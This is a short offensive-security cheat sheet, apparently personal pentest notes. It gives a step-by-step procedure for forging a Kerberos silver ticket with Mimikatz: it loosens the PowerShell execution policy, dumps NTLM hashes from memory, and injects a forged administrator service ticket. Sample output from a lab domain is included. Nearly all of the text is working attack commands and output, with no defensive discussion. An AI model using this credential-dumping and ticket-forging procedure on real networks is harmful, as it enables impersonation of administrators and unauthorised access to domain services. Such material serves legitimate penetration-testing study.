# Pass the Ticket

### Silver Ticket

1. Powershell as Administrator
2. Set-ExecutionPolicy Unrestricted
3. Obtain User SID (everything except the last 4 digits -XXXX) with whoami /user
4. Enum SPNs to gain ServicePrincipalName to split as service and target values eg. HTTP/WebService.domain.com becomes /service:HTTP /target:WebService.domain.com
5. Start Mimikatz with privilege::debug
6. Gain NTLM hash from sekurlsa::logonpasswords
7. Flush any tickets with kerberos::purge
8. Ensure no tickets with kerberos::list
9. Create the silver ticket

```
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /target:<TARGET> /service:<SERVICE> /rc4:<NTLM HASH> /ptt
```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:administrator /domain:futurama.local /sid:S-1-5-21-1375711201-1277040102-1320212398 /service:MSSQLSvc /target:SqlServer.futurama.local /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
User      : administrator
Domain    : futurama.local (FUTURAMA)
SID       : S-1-5-21-1375711201-1277040102-1320212398
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 2892d26cdf84d7a70e2eb3b9f05c425e - rc4_hmac_nt
Service   : MSSQLSvc
Target    : SqlServer.futurama.local
Lifetime  : 4/27/2022 5:15:26 PM ; 4/24/2032 5:15:26 PM ; 4/24/2032 5:15:26 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'administrator @ futurama.local' successfully submitted for current session

```
